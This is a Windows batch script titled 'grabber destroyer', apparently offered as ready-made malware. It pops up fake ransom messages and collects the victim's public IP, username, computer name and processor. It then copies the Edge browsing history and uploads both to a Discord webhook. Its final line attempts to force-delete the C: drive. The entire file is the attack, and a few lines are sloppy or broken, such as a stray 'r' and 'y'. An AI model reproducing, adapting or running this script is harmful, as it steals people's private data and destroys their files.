@echo off
title grabber destroyer
:: create messages box
msg * pc destroyed send money to "ur bitcoin/paypal"
msg * hacked by anonyme
echo detruit
cls

:: grabb ip
curl -4 icanhazip.com 1> tmpwanip & cls & set /p ipv4= < tmpwanip & set /p ipv4= < tmpwanip & del /f tmpwanip

set "message_text=**:crown: %username% was grabbed :crown:** \n\n :person_pouting: **Username : %username%** \n :detective:** IP : %ipv4%** \n :information_source:** LAPTOP ? : %computername%** \n :minidisc: **PROCESSOR : %PROCESSOR_IDENTIFIER%** \n :timer:** Date : %date% at %time%** \n\n :moyai:**__Created by Anonym0usse__ **\n **:floppy_disk: GITHUB : https://github.com/Anonym0usse** \n\n :newspaper: ** Historic :**\n "

curl -k -F "payload_json={\"content\": \"%message_text%\"}" https://discord.com/api/webhooks/[YOUR WEBHOOK]

:: create file
mkdir masked

:: copy files
xcopy "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default\History" "C:\Users\%username%\OneDrive\Bureau\masked"
cd "C:\Users\%username%\OneDrive\Bureau\masked"
rename "History" "Historique.txt"
r



set "attachment=C:\Users\%username%\OneDrive\Bureau\masked\Historique.txt"
curl -k -F "payload_json={\"content\": \"%message_text%\"}"  -F "file1=@%attachment%" https://discord.com/api/webhooks/[YOUR WEBHOOK]

:: delete all
del /f /f c:
y



